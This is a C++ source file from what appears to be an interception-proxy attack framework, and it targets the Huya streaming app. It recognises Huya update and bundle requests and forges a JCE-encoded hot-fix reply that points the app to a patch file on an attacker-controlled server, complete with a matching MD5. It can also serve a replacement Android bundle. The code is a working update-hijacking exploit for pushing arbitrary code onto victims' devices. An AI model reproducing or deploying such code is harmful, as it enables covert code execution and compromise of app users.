#include "HuYaPlugin.h"
#include "../support/JceStruct.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../Public.h"
#include "sslPublic.h"
#include "PluginServer.h"
#include "../attacker.h"


/*
qq jce https://bbs.pediy.com/thread-250845.htm

Key由tag和type组成
Key为1个字节或两个字节.两个字节时第二个字节为tag否则第一个字节的高4位为tag.type始终为第一个字节的低4位.
type最多有16种类型,tag最大为255.

当类型为6时,String的长度为一个字节
当类型为7时,String的长度为一个Int.且字符串的最大长度为104857600个字节

0
byte 或 bool
1
Short
2
Int
3
Long
4
Float
5
Double
6,7
String
8
Map
9
List
10
STRUCT_BEGIN 继承了JceStruct类的开始
11
STRUCT_END 继承了JceStruct类的结束
12
ZERO_TAG



0
int1
紧跟1个字节整型数据

1
int2
紧跟2个字节整型数据

2
int4
紧跟4个字节整型数据

3
int8
紧跟8个字节整型数据

4
float
紧跟4个字节浮点型数据

5
double
紧跟8个字节浮点型数据

6
String1
紧跟1个字节长度，再跟内容

7
String4
紧跟4个字节长度，再跟内容

8
Map
紧跟一个整型数据表示Map的大小，再跟[key, value]对列表

9
List
紧跟一个整型数据表示List的大小，再跟元素列表

10
自定义结构开始
自定义结构开始标志

11
自定义结构结束
自定义结构结束标志，Tag为0

12
数字0
表示数字0，后面不跟数据

13
SimpleList
简单列表（目前用在byte数组），紧跟一个类型字段（目前只支持byte），紧跟一个整型数据表示长度，再跟byte数据

14
-
-

15
-
-
https://blog.csdn.net/jiange_zh/article/details/86562232
*/

unsigned char jcehdr[] = 
{
	0x10, 0x03, 
	0x2C, 
	0x3C, 
	0x40, 0x01, 
	0x56, 0x08, 0x6D, 0x6F, 0x62, 0x69, 0x6C, 0x65, 0x75, 0x69,
	0x66, 0x20, 0x67, 0x65, 0x74, 0x44, 0x79, 0x6E, 0x61, 0x6D, 0x69, 0x63, 0x43, 0x6F, 0x6E, 0x66,
	0x69, 0x67, 0x48, 0x6F, 0x74, 0x46, 0x69, 0x78, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x49, 0x6E,
	0x66, 0x6F,

	0x7d, 0x00, 0x00,
	0x71, 0x08, 0x00, 
	0x02, 0x06, 0x00, 0x1D,0x00, 
	0x00, 0x01, 
	0x0C, 
	0x06, 0x04, 0x74,0x52, 0x73, 0x70, //tRsp

	0x1D,0x00, 0x00,

	0x5d,0x0A, 0x00, 0x01,

	0x16 
};

unsigned char HUYA_DATA_END[] = 
{
	0x31, 0x2c, 0x65,
	0x4C, 
	0x0B, 
	0x8C, 
	0x98, 0x0C, 
	0xA8, 0x0C
};


int gHuyaFlag = 0;

int HuYaPlugin::isHuya(const char * url, const char * host) {
	if (strstr(host,"wup.huya.com")   )
	{
		if (strstr(url, "/") ) {
			gHuyaFlag = 1;
			return TRUE;
		}
		
	}else if (strstr(host,"kiwistatic.huya.com") && strstr(url,"/newrnbundle/android/") && strstr(url,"android.zip") )
	{
		gHuyaFlag = 2;
		return TRUE;
	}
	return FALSE;

}


int HuYaPlugin::makeHuyaPluginReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	if (gHuyaFlag == 1)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: application/multipart-formdata\r\n"
			"Content-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n";

		int ret = 0;
		string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;


		string patchfn1 = "huya-patch.zip";

		string filename1 = Public::getUserPluginPath(lpssl->username) + patchfn1;


		char szmd5_1[64] = { 0 };

		unsigned char hexmd5[64] = { 0 };
		int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);


		char replydata[1024] = { 0 };
		int offset = 4;
		int len = sizeof(jcehdr) ;
		memcpy(replydata + offset, jcehdr, len);
		offset += len;

		string url = string("http://") + strip + "/" + patchfn1;
		*(replydata + offset) = (char)url.length();
		offset++;

		len = url.length();
		memcpy(replydata + offset, url.c_str(), len);
		offset += len;

		*(replydata + offset) = 0x26;
		offset++;

		*(replydata + offset) = 0x20;
		offset++;

		len = 32;
		memcpy(replydata + offset, szmd5_1, 32);
		offset += 32;

		len = sizeof(HUYA_DATA_END) ;
		memcpy(replydata + offset, HUYA_DATA_END, len);
		offset += len;

		*(int*)replydata = ntohl(offset);

		int httpresphdrlen = wsprintfA(dstbuf, szHttpFormat, offset);
		memcpy(dstbuf + httpresphdrlen, replydata, offset);

		return offset + httpresphdrlen;
	}else if (gHuyaFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lpssl->username, ANDROID_REPLACE_FILENAME);

		int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespFormat, 1);
		return ret;
	}

	return 0;
}

//https://kiwidl.msstatic.com/patch-adr-7.4.2-27980